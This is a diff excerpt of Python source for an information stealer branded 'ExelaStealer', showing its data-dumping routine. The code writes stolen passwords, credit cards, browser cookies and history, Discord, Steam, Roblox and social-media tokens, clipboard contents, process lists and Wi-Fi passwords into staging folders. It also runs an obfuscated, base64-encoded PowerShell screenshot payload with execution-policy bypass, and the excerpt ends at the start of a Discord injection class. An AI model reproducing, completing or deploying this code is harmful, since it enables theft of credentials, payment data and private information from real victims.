+                    q.write(str(ii) + "\n")
+        if not self.twitter == 0:
+            os.mkdir(tmp + f"\\{run}\\Twitter")
+            with open(tmp + f"\\{run}\\Twitter\\Twitter.txt", "a", encoding="utf-8", errors="ingore") as q:
+                q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                for tt in self.twitterr:
+                    q.write(str(tt) + "\n")
+        if not self.tiktok == 0:
+            os.mkdir(tmp + f"\\{run}\\Tiktok")
+            with open(tmp + f"\\{run}\\Tiktok\\Tiktok.txt", "a", encoding="utf-8", errors="ingore") as q:
+                q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                for ti in self.tiktokk:
+                    q.write(str(ti) + "\n")
+        if not self.reddit == 0:
+            os.mkdir(tmp + f"\\{run}\\Reddit")
+            with open(tmp + f"\\{run}\\Reddit\\Reddit.txt", "a", encoding="utf-8", errors="ingore") as q:
+                q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                for re in self.redditt:
+                    q.write(str(re) + "\n")
+        if self.fullTokens:
+            os.mkdir(tmp + f"\\{run}\\Tokens")
+            with open(tmp + f"\\{run}\\Tokens\\full_tokens.txt", "a", encoding="utf-8", errors="ingore") as q:
+                q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                for re in self.fullTokens:
+                    q.write(str(re) + "\n")
+        if self.validatedTokens:
+            with open(tmp + f"\\{run}\\Tokens\\validated_tokens.txt", "a", encoding="utf-8", errors="ingore") as q:
+                q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                for re in self.validatedTokens:
+                    q.write(str(re) + "\n")
+        if self.discrod:
+            with open(tmp + f"\\{run}\\Tokens\\discord_accounts.txt", "a", encoding="utf-8", errors="ingore") as q:
+                q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                for re in self.discordd:
+                    q.write(str(re) + "\n")
+
+        if not self.steam:
+            os.mkdir(tmp + f"\\{run}\\Steam")
+            with open(tmp + f"\\{run}\\Steam\\Steam.txt", "a", encoding="utf-8", errors="ingore") as q:
+                q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                for st in self.steamm:
+                    q.write(str(st) + "\n")
+        if self.roblox==True:
+            os.mkdir(tmp + f"\\{run}\\Roblox")
+            with open(tmp + f"\\{run}\\Roblox\\Roblox.txt", "a", encoding="utf-8", errors="ignore") as q:
+                q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                for robl in self.robloxx:
+                    q.write(str(robl))
+        if not self.growtopia == 0:
+            os.mkdir(tmp + f"\\{run}\\Growtopia")
+            with open(tmp + f"\\{run}\\Growtopia\\Growtopia.txt", "a", encoding="utf-8", errors="ingore") as q:
+                q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                for gw in self.growtopiaa:
+                    q.write(str(gw) + "\n")
+        if 5 < 10:
+            command = "JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA=" # Unicode encoded command
+            subprocess.run(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", command], shell=True, capture_output=True, cwd= tmp + f"\\{run}")
+        if 0 < 1:
+            active_window_title = self.get_active_window_title()
+            with open(tmp + f"\\{run}\\active_window.txt", "a", encoding="utf-8", errors="ignore") as x:
+                x.write(str(active_window_title))
+        if 7<15:
+            try:
+                process = subprocess.run("tasklist /FO LIST", capture_output= True, shell= True)
+                output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
+                with open(tmp + f"\\{run}\\process_list.txt", "w",encoding="utf-8", errors="ignore") as process_list:
+                    process_list.write(output)
+            except:
+                pass
+        if 5 > 4:
+            self.get_last_clipboard_text(run)
+            self.get_last_clipboard_image(run)        
+        if 45 > 3:
+            with open(tmp + f"\\{run}\\system_info.txt", "a", encoding="utf-8", errors="ignore") as micro:
+                micro.write("----------------------https://t.me/ExelaStealer----------------------\n======================================================================\n")
+            if mic_data:
                 with open(tmp + f"\\{run}\\system_info.txt", "a", encoding="utf-8", errors="ignore") as micro:
-                    micro.write("----------------------https://t.me/ExelaStealer----------------------\n======================================================================\n")
-                if mic_data:
+                    micro.write("Listed Microphone's\n======================================================================\n")
+                for mics in mic_data:
                     with open(tmp + f"\\{run}\\system_info.txt", "a", encoding="utf-8", errors="ignore") as micro:
-                        micro.write("Listed Microphone's\n======================================================================\n")
-                    for mics in mic_data:
-                        with open(tmp + f"\\{run}\\system_info.txt", "a", encoding="utf-8", errors="ignore") as micro:
-                            micro.write("Listed Microphone's\n" + mics + "\n")
-                self.get_all_system_data()
-            if 7855 < 8888:
-                self.GetWifiPasswords(tmp + f"\\{run}")
-        else:
-            os.mkdir(tmp + f"\\{run}")
-            if not self.passws == 0:
-                os.mkdir(tmp + f"\\{run}\\Passwords")
-                with open(tmp + f"\\{run}\\Passwords\\Passwords.txt", "a", encoding="utf-8", errors="ingore") as f:
-                    f.write("----------------------https://t.me/ExelaStealer----------------------\n" + "=" * 70 + "\n")
-                    for passwss in self.passw:
-                        f.write(str(passwss) + "\n")
-            if not self.cc == 0:
-                os.mkdir(tmp + f"\\{run}\\Cards")
-                with open(tmp + f"\\{run}\\Cards\\Cards.txt", "a", encoding="utf-8", errors="ingore") as x:
-                    x.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for uknowwhatiscc in self.ottomonCC:
-                        x.write(str(uknowwhatiscc) + "\n")
-            if not self.cookie == 0:
-                os.mkdir(tmp + f"\\{run}\\Cookies")
-                with open(tmp + f"\\{run}\\Cookies\\Cookies.txt", "a", encoding="utf-8", errors="ingore") as c:
-                    c.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for allCookies in self.cookeds:
-                        c.write(str(allCookies) + "\n")
-            if not self.downloads == 0:
-                os.mkdir(tmp + f"\\{run}\\Downloads")
-                with open(tmp + f"\\{run}\\Downloads\\Downloads.txt", "a", encoding="utf-8", errors="ingore") as d:
-                    d.write("----------------------https://t.me/ExelaStealer----------------------\n" + "=" * 70 + "\n")
-                    for dwnlds in self.sexDonwloads:
-                        d.write(str(dwnlds) + "\n")
-            if not self.historys == 0:
-                os.mkdir(tmp + f"\\{run}\\Historys")
-                with open(tmp + f"\\{run}\\Historys\\Historys.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for date in self.sexHistorys:
-                        q.write(str(date) + "\n")
-            if self.mozilla_history:
-                try:
-                    os.mkdir(tmp + f"\\{run}\\Firefox")
-                except:
-                    pass
-                with open(tmp + f"\\{run}\\Firefox\\History.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for date in self.mozilla_history:
-                        q.write(str(date) + "\n")
-            if self.mozilla_cookie:
-                try:
-                    os.mkdir(tmp + f"\\{run}\\Firefox")
-                except:
-                    pass
-                with open(tmp + f"\\{run}\\Firefox\\Cookies.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for date in self.mozilla_cookie:
-                        q.write(str(date) + "\n")
-            if not self.insta == 0:
-                os.mkdir(tmp + f"\\{run}\\Instagram")
-                with open(tmp + f"\\{run}\\Instagram\\instagram.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for ii in self.instaa:
-                        q.write(str(ii) + "\n")
-            if not self.twitter == 0:
-                os.mkdir(tmp + f"\\{run}\\Twitter")
-                with open(tmp + f"\\{run}\\Twitter\\Twitter.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for tt in self.twitterr:
-                        q.write(str(tt) + "\n")
-            if not self.tiktok == 0:
-                os.mkdir(tmp + f"\\{run}\\Tiktok")
-                with open(tmp + f"\\{run}\\Tiktok\\Tiktok.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for ti in self.tiktokk:
-                        q.write(str(ti) + "\n")
-            if not self.reddit == 0:
-                os.mkdir(tmp + f"\\{run}\\Reddit")
-                with open(tmp + f"\\{run}\\Reddit\\Reddit.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for re in self.redditt:
-                        q.write(str(re) + "\n")
-            if self.discrod:
-                os.mkdir(tmp + f"\\{run}\\Discord")
-                with open(tmp + f"\\{run}\\Discord\\Discord.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for re in self.discordd:
-                        q.write(str(re) + "\n")
-            if not self.steamm == 0:
-                os.mkdir(tmp + f"\\{run}\\Steam")
-                with open(tmp + f"\\{run}\\Steam\\Steam.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for st in self.steamm:
-                        q.write(str(st) + "\n")
-            if self.roblox==True:
-                os.mkdir(tmp + f"\\{run}\\Roblox")
-                with open(tmp + f"\\{run}\\Roblox\\Roblox.txt", "a", encoding="utf-8", errors="ignore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for robl in self.robloxx:
-                        q.write(str(robl))
-            if not self.growtopia == 0:
-                os.mkdir(tmp + f"\\{run}\\Growtopia")
-                with open(tmp + f"\\{run}\\Growtopia\\Growtopia.txt", "a", encoding="utf-8", errors="ingore") as q:
-                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for gw in self.growtopiaa:
-                        q.write(str(gw) + "\n")
-            if 5 < 10:
-                command = "JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA=" # Unicode encoded command
-                subprocess.run(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", command], shell=True, capture_output=True, cwd= tmp + f"\\{run}")
-            if 0 < 1:
-                active_window_title = self.get_active_window_title()
-                with open(tmp + f"\\{run}\\active_window.txt", "a", encoding="utf-8", errors="ignore") as x:
-                    x.write(str(active_window_title))
-            if 7<15:
-                try:
-                    process = subprocess.run("tasklist /FO LIST", capture_output= True, shell= True)
-                    output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
-                    with open(tmp + f"\\{run}\\process_list.txt", "w",encoding="utf-8", errors="ignore") as process_list:
-                        process_list.write(output)
-                except:
-                    pass
-            if 5 > 4:
-                self.get_last_clipboard_text(run)
-                self.get_last_clipboard_image(run)
-            if 45 > 3:
-                with open(tmp + f"\\{run}\\system_info.txt", "a", encoding="utf-8", errors="ignore") as micro:
-                    micro.write("----------------------https://t.me/ExelaStealer----------------------\n======================================================================\n")
-                if mic_data:
-                    with open(tmp + f"\\{run}\\system_info.txt", "a", encoding="utf-8", errors="ignore") as micro:
-                        micro.write("Listed Microphone's\n======================================================================\n")
-                    for mics in mic_data:
-                        with open(tmp + f"\\{run}\\system_info.txt", "a", encoding="utf-8", errors="ignore") as micro:
-                            micro.write("Listed Microphone's\n" + mics + "\n")
-                self.get_all_system_data()
-            if 7855 < 8888:
-                self.GetWifiPasswords(tmp + f"\\{run}")
+                        micro.write("Listed Microphone's\n" + mics + "\n")
+            self.get_all_system_data()
+        if 7855 < 8888:
+            self.GetWifiPasswords(tmp + f"\\{run}")
+        
 class DiscordInjection:
     def __init__(self) -> None:
         self.local_appdata = os.getenv("LOCALAPPDATA")
